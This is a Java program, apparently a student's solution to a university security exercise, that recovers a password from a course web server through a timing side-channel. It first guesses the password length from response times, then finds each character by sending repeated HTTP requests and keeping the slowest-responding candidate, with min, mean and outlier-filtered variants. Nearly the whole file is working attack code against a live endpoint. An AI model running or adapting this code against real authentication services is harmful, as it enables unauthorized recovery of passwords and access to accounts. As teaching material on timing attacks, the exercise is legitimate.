import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.*;

public class ex01_M2 {

	static final String URL = "http://aoi.ise.bgu.ac.il/?user=307889287&password=";
	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
	static final String DIFFICULTY = "&difficulty=";

	final static char[] LETTERS = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

	/**
	 * @param args
	 */
	public static void main(String[] args) throws Exception {
		int difficulty = 100;
		int attempts = 5;
		// int len = findPasswordLength(3, difficulty);
		// System.out.println("password length: " + len);

		String passwd = findPasswordStd(attempts, difficulty); 
		System.out.println("@@@@@@@@@@" + passwd);
		//...
		//System.out.println(username  +  " "  +  password  +  " "  +  difficulty);
		//...
		//System.out.println("We have a problem");
	}

	public static int findPasswordLengthMin(int attempts, int difficulty) {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[] reqTimes = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		for (int i = 0; i < maxLen; i ++ ) {
			reqTimes[i] = Double.MAX_VALUE;
			// reqTimes[i] = 0;
		}

		for (int i = 0; i < attempts; i ++ ) {
			passwd = "";
			for (int j = 0; j < maxLen; j ++ ) {
				passwd += "a";
				curReqTime = getReqTime(URL  +  passwd  +  DIFFICULTY  +  difficulty);
				//curReqTime = getReqTimeCurl(URL  +  passwd  +  DIFFICULTY  +  difficulty);
				reqTimes[j] = Math.min(reqTimes[j], curReqTime);
				// reqTimes[j] += curReqTime;
				System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
			}

		}

		for (int i = 0; i < maxLen; i ++ ) {
			System.out.println(reqTimes[i]);
			// reqTimes[i] = reqTimes[i]/attempts;
			System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
			if (maxReqTime < reqTimes[i]) {
				maxReqTime = reqTimes[i];
				len = i + 1;
			}
		}

		System.out.println("passwd length: " + len);
		return len;
	}

	public static int findPasswordLengthAvg(int attempts, int difficulty) {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[] reqTimes = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		for (int i = 0; i < maxLen; i ++ ) {
			//reqTimes[i] = Double.MAX_VALUE;
			reqTimes[i] = 0;
		}

		for (int i = 0; i < attempts; i ++ ) {
			passwd = "";
			for (int j = 0; j < maxLen; j ++ ) {
				passwd += "a";
				curReqTime = getReqTime(URL  +  passwd  +  DIFFICULTY  +  difficulty);
				//curReqTime = getReqTimeCurl(URL  +  passwd  +  DIFFICULTY  +  difficulty);
				// reqTimes[j] = Math.min(reqTimes[j], curReqTime);
				reqTimes[j] += curReqTime;
				System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[j]);
			}

		}

		for (int i = 0; i < maxLen; i ++ ) {
			System.out.println(reqTimes[i]);
			reqTimes[i] = reqTimes[i]/attempts;
			System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimes[i]);
			if (maxReqTime < reqTimes[i]) {
				maxReqTime = reqTimes[i];
				len = i + 1;
			}
		}

		System.out.println("passwd length: " + len);
		return len;
	}



	public static String findPasswordMin(int attempts, int difficulty) {

		int len = findPasswordLengthMin(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[] reqTimes = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";
		// String passwd = "yzdgalnekz";
		// String passwd = "yzdgalnekzIuSqn";
		String passSuff = new String(new char[len-(passwd.length() + 1)]).replace('\0', '0');

		for (int i = passwd.length(); i < len-1; i ++ ) {

			maxReqTime = 0;
			for (int j = 0; j < lettersLen; j ++ ) {
				reqTimes[j] = Double.MAX_VALUE;
				// reqTimes[i] = 0;
			}

			for (int j = 0; j < attempts; j ++ ) {
				for (int k = 0; k < lettersLen; k ++ ) {
					curReqTime = getReqTime(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
					//curReqTime = getReqTimeCurl(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
					reqTimes[k] = Math.min(reqTimes[k], curReqTime);
					// reqTimes[k] = reqTimes[k] += curReqTime;
					System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
				}

			}

			for (int j = 0; j < lettersLen; j ++ ) {
				// reqTimes[j] = reqTimes[j]/attempts;
				System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
				if (maxReqTime < reqTimes[j]) {
					maxReqTime = reqTimes[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);
		}

		boolean res;
		for (int i = 0; i < lettersLen; i ++ ) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
			System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
			if(res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return "";
	}

	public static String findPasswordAvg(int attempts, int difficulty) {

		int len = findPasswordLengthAvg(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[] reqTimes = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";
		// String passwd = "yzdgalnekz";
		// String passwd = "yzdgalnekzIuSqn";
		String passSuff = new String(new char[len-(passwd.length() + 1)]).replace('\0', '0');



		for (int i = passwd.length(); i < len-1; i ++ ) {

			maxReqTime = 0;
			for (int j = 0; j < lettersLen; j ++ ) {
				// reqTimes[j] = Double.MAX_VALUE;
				reqTimes[i] = 0;
			}

			for (int j = 0; j < attempts; j ++ ) {

				for (int k = 0; k < lettersLen; k ++ ) {
					curReqTime = getReqTime(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
					// curReqTime = getReqTimeCurl(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
					//reqTimes[k] = Math.min(reqTimes[k], curReqTime);
					reqTimes[k] += curReqTime;
					System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
				}

			}

			for (int j = 0; j < lettersLen; j ++ ) {
				reqTimes[j] = reqTimes[j]/attempts;
				System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimes[j]);
				if (maxReqTime < reqTimes[j]) {
					maxReqTime = reqTimes[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);
		}

		boolean res;
		for (int i = 0; i < lettersLen; i ++ ) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
			System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
			if(res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return "";
	}


	public static int findPasswordLengthStd(int attempts, int difficulty) {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[][] reqTimes = new double[attempts][maxLen];
		double[] reqTimesFilter = new double[maxLen];
		double curReqTime = 0;
		String passwd;

		for (int i = 0; i < attempts; i ++ ) {
			passwd = "";
			for (int j = 0; j < maxLen; j ++ ) {
				passwd += "a";
				curReqTime = getReqTime(URL  +  passwd  +  DIFFICULTY  +  difficulty);
				//curReqTime = getReqTimeCurl(URL  +  passwd  +  DIFFICULTY  +  difficulty);
				// reqTimes[j] = Math.min(reqTimes[j], curReqTime);
				reqTimes[i][j] = curReqTime*curReqTime;
				System.out.println("attempt: " + i + " length: " + (j + 1) + " reqTime: " + reqTimes[i][j]);
			}

		}

		for (int j = 0; j < maxLen; j ++ ) {
			double sum = 0;     // stores sum of elements
			double sumsq = 0; // stores sum of squares
			double mean = 0;
			double var = 0;
			double std = 0;
			int newAttempts = 0;

			for (int i = 0; i < attempts; i ++ ) {
				sum += reqTimes[i][j];
				sumsq += reqTimes[i][j]*reqTimes[i][j];
			}
			mean = sum / attempts;
			var = sumsq / attempts - mean*mean;
			std = Math.sqrt(var);

			curReqTime = 0;

			for (int i = 0; i < attempts; i ++ ) {
				if(reqTimes[i][j] > mean - 1*std && reqTimes[i][j] < mean + 1*std) {
					curReqTime += reqTimes[i][j];
					newAttempts ++;
				}
			}

			reqTimesFilter[j] = curReqTime/newAttempts;
		}


		for (int i = 0; i < maxLen; i ++ ) {
			System.out.println("length: " + (i + 1) + " mean reqTime: " + reqTimesFilter[i]);
			if (maxReqTime < reqTimesFilter[i]) {
				maxReqTime = reqTimesFilter[i];
				len = i + 1;
			}
		}

		System.out.println("passwd length: " + len);
		return len;
	}

	public static String findPasswordStd(int attempts, int difficulty) {

		int len = findPasswordLengthStd(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[][] reqTimes = new double[attempts][lettersLen];
		double[] reqTimesFilter = new double[lettersLen];
		double curReqTime = 0;
		char curChar = '0';
		String passwd = "";
		// String passwd = "yzdgalnekz";
		// String passwd = "yzdgalnekzIuSqn";
		String passSuff = new String(new char[len-(passwd.length() + 1)]).replace('\0', '0');



		for (int i = passwd.length(); i < len-1; i ++ ) {

			maxReqTime = 0;

			for (int j = 0; j < attempts; j ++ ) {

				for (int k = 0; k < lettersLen; k ++ ) {
					curReqTime = getReqTime(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
					// curReqTime = getReqTimeCurl(URL  +  passwd  +  LETTERS[k]  +  passSuff  +  DIFFICULTY  +  difficulty);
					//reqTimes[k] = Math.min(reqTimes[k], curReqTime);
					reqTimes[j][k] = curReqTime*curReqTime;
					System.out.println("attempt: " + j + " passwd: " + passwd + LETTERS[k] + passSuff + " reqTime: " + curReqTime);
				}

			}

			for (int j = 0; j < lettersLen; j ++ ) {
				double sum = 0;     // stores sum of elements
				double sumsq = 0; // stores sum of squares
				double mean = 0;
				double var = 0;
				double std = 0;
				int newAttempts = 0;

				for (int k = 0; k < attempts; k ++ ) {
					sum += reqTimes[k][j];
					sumsq += reqTimes[k][j]*reqTimes[k][j];
				}
				mean = sum / attempts;
				var = sumsq / attempts - mean*mean;
				std = Math.sqrt(var);

				curReqTime = 0;

				for (int k = 0; k < attempts; k ++ ) {
					if(reqTimes[k][j] > mean - 1*std && reqTimes[k][j] < mean + 1*std) {
						curReqTime += reqTimes[k][j];
						newAttempts ++;
					}
				}

				reqTimesFilter[j] = curReqTime/newAttempts;
			}


			for (int j = 0; j < lettersLen; j ++ ) {
				System.out.println("passwd: " + passwd + LETTERS[j] + passSuff + " reqTime: " + reqTimesFilter[j]);
				if (maxReqTime < reqTimesFilter[j]) {
					maxReqTime = reqTimesFilter[j];
					curChar = LETTERS[j];
				}
			}

			passwd += curChar;
			passSuff = passSuff.substring(1);
		}

		boolean res;
		for (int i = 0; i < lettersLen; i ++ ) {
			res = sendReq(URL + passwd + LETTERS[i] + DIFFICULTY + difficulty);
			System.out.println("passwd: " + passwd + LETTERS[i] + " res: " + res);
			if(res) {
				passwd += LETTERS[i];
				return passwd;
			}
		}

		return "";
	}

	/*

	public static boolean sendReq(String url) {

		try {
			Process process = Runtime.getRuntime().exec(CURL_CMD_START +  url);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			return stdInput.readLine().equals("1");

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}


	public static double getReqTime(String url) {

		try {
			Process process = Runtime.getRuntime().exec(CURL_CMD_START + url);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			stdInput.readLine();
			return Double.parseDouble(stdInput.readLine());

		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}
	 */

	public static boolean sendReq(String urlString) {

		try {
			URL url = new URL(urlString);
			URLConnection conn = url.openConnection();
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

			boolean res = stdInput.readLine().equals("1");
			stdInput.close();

			return res;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}


	public static double getReqTime(String urlString) {
		try {

			long milliStart = System.nanoTime();

			URL url = new URL(urlString);
			URLConnection conn = url.openConnection();
			conn.getInputStream();

			long milliEnd = System.nanoTime();

			return milliEnd - milliStart;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return -1;
	}

	public static double getReqTimeCurl(String url) {

		String curl_cmd = CURL_CMD_START  +  url;
		String res = "";
		String time = "";
		try {
			Process process = Runtime.getRuntime().exec(curl_cmd);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));

			res = stdInput.readLine();
			time = stdInput.readLine();

			process.destroy();
		} catch (Exception e) {
			e.printStackTrace();
		}

		return Double.parseDouble(time);
	}
}
